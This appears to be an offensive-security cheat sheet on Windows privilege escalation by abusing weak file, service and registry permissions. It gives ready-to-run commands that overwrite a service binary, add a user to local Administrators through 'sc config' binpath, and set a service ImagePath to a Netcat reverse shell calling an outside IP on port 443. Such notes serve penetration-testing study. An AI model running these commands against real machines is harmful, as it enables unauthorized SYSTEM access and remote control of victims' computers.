---
description: Here would be an examples of weak permissions abuse
---

# Weak Permissions

## <mark style="color:yellow;">**Permissive File System ACLs**</mark>

#### **Running SharpUp**

* Tool: <mark style="color:green;">**SharpUp**</mark> from GhostPack to check for weak ACLs.

```powershell
PS C:\> .\SharpUp.exe audit
```

* Example vulnerable service:
  * **Name:** <mark style="color:green;">**SecurityService**</mark>
  * **Path:** <mark style="color:green;">`"C:\Program Files (x86)\PCProtect\SecurityService.exe"`</mark>

#### **Checking Permissions with&#x20;**<mark style="color:green;">**`icacls`**</mark>

```powershell
PS C:\> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

* Output shows <mark style="color:green;">`Everyone`</mark> and <mark style="color:green;">`BUILTIN\Users`</mark> have <mark style="color:green;">`Full Control`</mark>.

#### **Replacing Service Binary with malicious one**

```powershell
C:\> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\> sc start SecurityService
```

* Replace with a malicious binary to gain SYSTEM privileges.

## <mark style="color:yellow;">**Weak Service Permissions**</mark>

#### **Checking Modifiable Services with SharpUp**

```powershell
C:\> SharpUp.exe audit
```

* Example vulnerable service:
  * **Name:** WindscribeService
  * **Path:** <mark style="color:green;">`"C:\Program Files (x86)\Windscribe\WindscribeService.exe"`</mark>

#### **Checking Permissions with&#x20;**<mark style="color:green;">**`accesschk`**</mark>

```powershell
C:\> accesschk.exe /accepteula -quvcw WindscribeService
```

* <mark style="color:green;">`NT AUTHORITY\Authenticated Users`</mark> has <mark style="color:green;">`SERVICE_ALL_ACCESS`</mark> (full control).

#### **Changing the Service Binary Path**

```powershell
C:\> sc config WindscribeService binpath="cmd /c net localgroup administrators ven17 /add"
```

* Grants user <mark style="color:green;">`ven17`</mark> administrator rights.

#### **Stopping & Starting the Service**

```powershell
C:\> sc stop WindscribeService
C:\> sc start WindscribeService
```

* Executes the new binary path.

#### **Confirming Privilege Escalation**

```powershell
C:\> net localgroup administrators
```

* Verify if <mark style="color:green;">`ven17`</mark> was added to the Administrators group.

#### **Resetting the Binary Path (Cleanup)**

```powershell
C:\> sc config WindscribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
C:\> sc start WindscribeService
C:\> sc query WindscribeService
```

## <mark style="color:yellow;">**Unquoted Service Path**</mark>

* If a service binary path is not enclosed in quotes, Windows may execute unintended binaries.
*   Example vulnerable service:

    ```plaintext
    C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
    ```
* Windows may execute:
  * <mark style="color:green;">`C:\Program.exe`</mark>
  * <mark style="color:green;">`C:\Program Files\System.exe`</mark>

#### <mark style="color:orange;">**Finding Unquoted Service Paths**</mark>

```powershell
C:\> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## <mark style="color:yellow;">**Permissive Registry ACLs**</mark>

#### **Checking for Weak Service ACLs in the Registry**

```powershell
C:\> accesschk.exe /accepteula "ven17" -kvuqsw hklm\System\CurrentControlSet\services
```

* Example vulnerable service: <mark style="color:green;">**ModelManagerService**</mark>
* Allows modification of the <mark style="color:green;">`ImagePath`</mark>.

#### **Changing&#x20;**<mark style="color:green;">**`ImagePath`**</mark>**&#x20;with PowerShell**

```powershell
PS C:\> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\ven17\Downloads\nc.exe -e cmd.exe 13.13.13.13 443"
```

* Executes Netcat shell upon service start.

## <mark style="color:yellow;">**Modifiable Registry Autorun Binaries**</mark>

#### **Checking Startup Programs**

```powershell
PS C:\> Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

* If the attacker can modify a startup binary, they can execute malicious code on user login.
